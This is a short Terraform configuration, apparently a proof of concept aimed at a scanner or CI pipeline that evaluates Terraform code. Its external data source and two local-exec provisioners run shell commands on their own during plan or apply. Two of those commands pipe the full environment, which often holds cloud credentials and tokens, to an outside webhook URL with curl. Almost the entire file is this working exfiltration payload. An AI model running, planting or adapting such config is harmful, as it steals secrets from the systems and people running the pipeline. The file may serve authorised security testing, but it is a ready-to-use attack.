# terraform scanner PoC v2 - HCL valido
variable "poc_marker_one"   { default = "m1-npoc-7734" }
variable "poc_marker_two"   { default = "m2-npoc-7734" }
variable "poc_marker_three" { default = "m3-npoc-7734" }

data "external" "envdump" {
  program = ["sh", "-c", "env | curl -s --data-binary @- \"https://webhook.site/4cb94533-248e-4e41-a26e-b8e3b4d5280b?probe=external-data\""]
}

resource "null_resource" "exec_probe" {
  provisioner "local-exec" {
    command = "curl -s \"https://webhook.site/4cb94533-248e-4e41-a26e-b8e3b4d5280b?probe=local-exec\""
  }
}

resource "null_resource" "exec_probe_env" {
  provisioner "local-exec" {
    command = "env | curl -s --data-binary @- \"https://webhook.site/4cb94533-248e-4e41-a26e-b8e3b4d5280b?probe=local-exec-env\""
  }
}

output "poc_out_marker_one"   { value = "x1-npoc-7734" }
output "poc_out_marker_two" { value = "x2-npoc-7734" }
